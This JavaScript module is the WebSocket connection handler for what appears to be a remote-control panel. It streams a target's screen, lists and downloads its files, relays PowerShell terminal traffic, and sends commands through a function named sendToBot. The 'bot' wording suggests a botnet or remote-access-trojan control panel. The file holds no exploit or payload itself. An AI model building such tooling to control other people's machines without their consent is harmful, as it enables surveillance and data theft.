// frontend/client_control/js/modules/websocket/connection.js

import { AppState } from '../core/states.js';
import { decodePacket, encodePacket } from '../../../../dashboard/js/modules/websocket/protocol.js';
import { renderScreenRGBA } from '../features/screen_renderer.js';

let socket = null;
const dec = new TextDecoder();
const $ = id => document.getElementById(id);

const ui = (id, val) => { if ($(id)) $(id).textContent = val ?? '...'; };

const setOnline = (on) => {
    const el = $('status-indicator');
    el?.classList.toggle('online', on);
    el?.classList.toggle('offline', !on);
    ui('status-text', on ? 'online' : 'offline');
};

const handleIncomingData = (buf) => {
    const pkg = decodePacket(buf);
    if (!pkg) return;

    // В V7.2 decodePacket возвращает { id, module, meta, payload }
    const { module, meta, payload } = pkg;

    // 1. ScreenView (Видеопоток) - Самый приоритетный по скорости
    if (module.startsWith('ScreenView')) {
        if (typeof payload === 'number') return;
        return renderScreenRGBA(payload);
    }

    // 2. SystemInfo (Метаданные клиента)
    if (module === 'SystemInfo') {
        try {
            const data = typeof payload === 'string' ? JSON.parse(payload) : payload;
            if (data && data.id === AppState.clientId) {
                if (data.ip) ui('display-ip', data.ip);
                if (data.id) ui('display-id', data.id);
                if (data.status) setOnline(data.status === 'online');
                AppState.lastSystemData = data;
            }
        } catch (e) {}
        return;
    }

    // 3. FileManager (Списки файлов)
    if (module === 'FileManager') {
        try {
            const json = typeof payload === 'string' ? JSON.parse(payload) : payload;
            if (json) window.renderFileSystem?.(json);
        } catch (e) {
            console.error("[FileManager] JSON Error:", e);
        }
        return;
    }

    // 4. FileTransfer (Скачивание С БОТА)
    if (module === 'FileTransfer') {
        window.dispatchEvent(new CustomEvent('FileTransfer_Start', { 
            detail: { name: meta, size: payload } 
        }));
        return;
    }

    if (module === 'FileTransferStream') {
        window.dispatchEvent(new CustomEvent('FileTransfer_Chunk', { 
            detail: { name: meta, data: payload } 
        }));
        return;
    }

    // 5. УНИВЕРСАЛЬНАЯ МАРШРУТИЗАЦИЯ (Terminal, Streams, etc.)
    // Создаем ключ события: "Powershell:None", "Powershell:Stream" и т.д.
    const eventKey = (meta && meta !== 'None') ? `${module}:${meta}` : `${module}:None`;
    
    // Генерируем событие, которое слушают terminal.js и другие модули
    window.dispatchEvent(new CustomEvent(eventKey, { 
        detail: payload 
    }));
};

export const initControlConnection = () => {
    const { clientId: tid } = AppState;
    const [token, login] = ['auth_token', 'user_login'].map(k => localStorage.getItem(k));
    if (!token || !login || !tid) return;

    const url = `${location.protocol === 'https:' ? 'wss:' : 'ws:'}//${location.host}/ws?token=${token}&login=${login}&mode=control&target=${encodeURIComponent(tid)}`;
    socket = new WebSocket(url);
    socket.binaryType = 'arraybuffer';

    socket.onopen = () => setOnline(true);
    socket.onmessage = (e) => handleIncomingData(e.data);
    socket.onclose = () => setOnline(false);

    /**
     * Универсальная отправка НА БОТ
     * @param {string} modName - Формат "ModuleName:Meta" или "ModuleName"
     * @param {any} pay - JSON объект, Число или ArrayBuffer
     */
    window.sendToBot = (modName, pay) => {
        if (socket?.readyState === 1) {
            // Если в modName нет двоеточия, добавляем :None для соблюдения V7.2
            const fullMod = modName.includes(':') ? modName : `${modName}:None`;
            socket.send(encodePacket(tid, fullMod, pay));
        }
    };
};